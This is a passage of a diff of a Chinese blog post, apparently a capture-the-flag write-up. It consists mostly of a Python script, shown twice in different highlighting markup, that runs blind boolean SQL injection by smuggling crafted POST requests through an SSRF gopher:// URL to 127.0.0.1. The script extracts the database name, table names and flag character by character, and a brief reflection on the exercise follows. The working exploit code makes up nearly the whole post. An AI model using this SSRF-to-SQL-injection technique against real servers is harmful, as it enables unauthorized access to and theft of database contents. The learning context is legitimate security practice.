class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload =\</span><br><span class="hljs-comment"># &quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-comment"># Host: xxxx</span><br><span class="hljs-comment"># Content-Length: 48</span><br><span class="hljs-comment"># Cache-Control: max-age=0</span><br><span class="hljs-comment"># Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-comment"># Origin: xxxx</span><br><span class="hljs-comment"># Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment"># Referer: xxxxx</span><br><span class="hljs-comment"># Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment"># Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment"># Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-comment"># Connection: close</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br><span class="hljs-comment"># #爆数据库名</span><br><span class="hljs-comment"># basename=&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(1,4):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert=&quot;id=1/**/and/**/ascii(substr(database(),%d,1))=%d&quot; %(i,number)</span><br><span class="hljs-comment">#         # insert = &quot;id=1/**/and/**/ascii(substr(database(),1,1))=&#123;&#125;&quot;.format((str)(number))</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;ok&#x27;,chr(number))</span><br><span class="hljs-comment">#             basename=basename+chr(number)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br>basename=<span class="hljs-string">&#x27;rua&#x27;</span><br><br><span class="hljs-comment">#爆表名</span><br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-string">Host: xxxxxx</span><br><span class="hljs-string">Content-Length: 77</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-string">Origin: xxxxxx</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Referer: xxxxxxx</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># i=1</span><br><span class="hljs-comment"># while(i&lt;10):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert = &quot;id=1/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),%d,1))=%d&quot;%(i,number)</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         # print(req.text)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;yes&#x27;,chr(number),i)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#nothing</span><br>final=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    number=<span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span>(number&lt;<span class="hljs-number">128</span>):<br>        insert = <span class="hljs-string">&quot;id=1/**/and/**/ascii(substr((select/**/flag/**/from/**/rua.flag),%d,1))=%d&quot;</span>%(i,number)<br>        <span class="hljs-comment"># print(insert)</span><br>        payloads=payload+<span class="hljs-string">&#x27;\n&#x27;</span>+insert+<span class="hljs-string">&#x27;\n&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>        tmp = urllib.parse.quote(payloads)<br>        new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>        result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>        <span class="hljs-comment"># 请求网页</span><br>        url = <span class="hljs-string">&#x27;xxxxxxx&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: result&#125;<br>        <span class="hljs-comment"># print(data)</span><br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;meow&#x27;</span> <span class="hljs-keyword">in</span> req.text):<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>,<span class="hljs-built_in">chr</span>(number))<br>             final=final+<span class="hljs-built_in">chr</span>(number)<span class="hljs-comment">#+str(i)</span><br>             <span class="hljs-built_in">print</span>(final)<br>             <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            number = number + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(number),<span class="hljs-string">&#x27;no&#x27;</span>)<br><span class="hljs-built_in">print</span>(final)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># payload =\</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;POST /xxxxx HTTP/1.1</span></span><br><span class="line"><span class="comment"># Host: xxxx</span></span><br><span class="line"><span class="comment"># Content-Length: 48</span></span><br><span class="line"><span class="comment"># Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment"># Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span></span><br><span class="line"><span class="comment"># Origin: xxxx</span></span><br><span class="line"><span class="comment"># Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment"># Referer: xxxxx</span></span><br><span class="line"><span class="comment"># Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment"># Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"># Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span></span><br><span class="line"><span class="comment"># Connection: close</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># #爆数据库名</span></span><br><span class="line"><span class="comment"># basename=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(1,4):</span></span><br><span class="line"><span class="comment">#     number = 65</span></span><br><span class="line"><span class="comment">#     while(number&lt;123):</span></span><br><span class="line"><span class="comment">#         insert=&quot;id=1/**/and/**/ascii(substr(database(),%d,1))=%d&quot; %(i,number)</span></span><br><span class="line"><span class="comment">#         # insert = &quot;id=1/**/and/**/ascii(substr(database(),1,1))=&#123;&#125;&quot;.format((str)(number))</span></span><br><span class="line"><span class="comment">#         # print(insert)</span></span><br><span class="line"><span class="comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment">#         # print(payload)</span></span><br><span class="line"><span class="comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line"><span class="comment">#         tmp = urllib.parse.quote(payloads)</span></span><br><span class="line"><span class="comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span></span><br><span class="line"><span class="comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span></span><br><span class="line"><span class="comment">#         # 请求网页</span></span><br><span class="line"><span class="comment">#         url = &#x27;xxxxxx&#x27;</span></span><br><span class="line"><span class="comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span></span><br><span class="line"><span class="comment">#         # print(data)</span></span><br><span class="line"><span class="comment">#         req = requests.post(url=url, data=data)</span></span><br><span class="line"><span class="comment">#         if(&#x27;meow&#x27; in req.text):</span></span><br><span class="line"><span class="comment">#             print(&#x27;ok&#x27;,chr(number))</span></span><br><span class="line"><span class="comment">#             basename=basename+chr(number)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             number = number + 1</span></span><br><span class="line"><span class="comment">#     i=i+1</span></span><br><span class="line"><span class="comment"># 114 117 97 rua</span></span><br><span class="line"><span class="comment"># print(basename)</span></span><br><span class="line">basename=<span class="string">&#x27;rua&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /xxxxx HTTP/1.1</span></span><br><span class="line"><span class="string">Host: xxxxxx</span></span><br><span class="line"><span class="string">Content-Length: 77</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span></span><br><span class="line"><span class="string">Origin: xxxxxx</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: xxxxxxx</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># i=1</span></span><br><span class="line"><span class="comment"># while(i&lt;10):</span></span><br><span class="line"><span class="comment">#     number = 65</span></span><br><span class="line"><span class="comment">#     while(number&lt;123):</span></span><br><span class="line"><span class="comment">#         insert = &quot;id=1/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),%d,1))=%d&quot;%(i,number)</span></span><br><span class="line"><span class="comment">#         # print(insert)</span></span><br><span class="line"><span class="comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment">#         # print(payload)</span></span><br><span class="line"><span class="comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line"><span class="comment">#         tmp = urllib.parse.quote(payloads)</span></span><br><span class="line"><span class="comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span></span><br><span class="line"><span class="comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span></span><br><span class="line"><span class="comment">#         # 请求网页</span></span><br><span class="line"><span class="comment">#         url = &#x27;xxxxxxx&#x27;</span></span><br><span class="line"><span class="comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span></span><br><span class="line"><span class="comment">#         # print(data)</span></span><br><span class="line"><span class="comment">#         req = requests.post(url=url, data=data)</span></span><br><span class="line"><span class="comment">#         # print(req.text)</span></span><br><span class="line"><span class="comment">#         if(&#x27;meow&#x27; in req.text):</span></span><br><span class="line"><span class="comment">#             print(&#x27;yes&#x27;,chr(number),i)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             number = number + 1</span></span><br><span class="line"><span class="comment">#     i=i+1</span></span><br><span class="line"><span class="comment"># 114 117 97 rua</span></span><br><span class="line"><span class="comment"># print(basename)</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="comment">#nothing</span></span><br><span class="line">final=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    number=<span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(number&lt;<span class="number">128</span>):</span><br><span class="line">        insert = <span class="string">&quot;id=1/**/and/**/ascii(substr((select/**/flag/**/from/**/rua.flag),%d,1))=%d&quot;</span>%(i,number)</span><br><span class="line">        <span class="comment"># print(insert)</span></span><br><span class="line">        payloads=payload+<span class="string">&#x27;\n&#x27;</span>+insert+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="comment">#注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">        tmp = urllib.parse.quote(payloads)</span><br><span class="line">        new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">        result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">        <span class="comment"># 请求网页</span></span><br><span class="line">        url = <span class="string">&#x27;xxxxxxx&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;url&#x27;</span>: result&#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        req = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(req.text)</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;meow&#x27;</span> <span class="keyword">in</span> req.text):</span><br><span class="line">             <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>,<span class="built_in">chr</span>(number))</span><br><span class="line">             final=final+<span class="built_in">chr</span>(number)<span class="comment">#+str(i)</span></span><br><span class="line">             <span class="built_in">print</span>(final)</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            number = number + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(number),<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(final)</span><br></pre></td></tr></table></figure>
 
 <h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>算是很开心拿到这一题的flag，虽然很简单，对ssrf有了更深刻的认识，对python简单脚本的编写认识更深了一点，这里说一个web页面请求头content-length，读取自己post提交数据的表单长度，只有大于或者等于post表单长度才能完整的读取post提交的数据，否则数据读不完整，但是，也不能很大，大了的话跑脚本的时候运行速度会很慢，所以自己在写的时候要特别注意length的大小。其次，自己读题审题一定要仔细，这里漏一点，那里漏一点还怎么玩。进而，脚本编写的太朴素，谁都能看懂，效率就慢了点，等我什么时候再重新写一下这个脚本，再多学学才行。</p>
 <p>很感谢kxy同学，今天帮了我很大的忙，对我的提问做出了讲解，讲的很好，下次还来。</p>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/self-study/">self study</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/just-a-little/">just a little</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/02/13/exercise/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">exercise</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/01/10/javascript/">
-                        <span class="hidden-mobile">javascript</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-  
-
-  
-
-  
-</footer>
-
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  
-    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
-  
-  
-    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
-  
-
-
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-</body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/13/sql/">http://example.com/2022/01/13/sql/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/just-a-little/">just a little</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/13/exercise/" title="exercise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">exercise</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/10/javascript/" title="javascript"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">javascript</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/11/22/docker/" title="docker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">docker</div></div></a></div><div><a href="/2021/11/22/flask/" title="flask study"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">flask study</div></div></a></div><div><a href="/2022/03/03/java/" title="java"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-03</div><div class="title">java</div></div></a></div><div><a href="/2022/01/10/javascript/" title="javascript"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-10</div><div class="title">javascript</div></div></a></div><div><a href="/2022/05/13/searching/" title="searchinging"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-13</div><div class="title">searchinging</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">小总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div 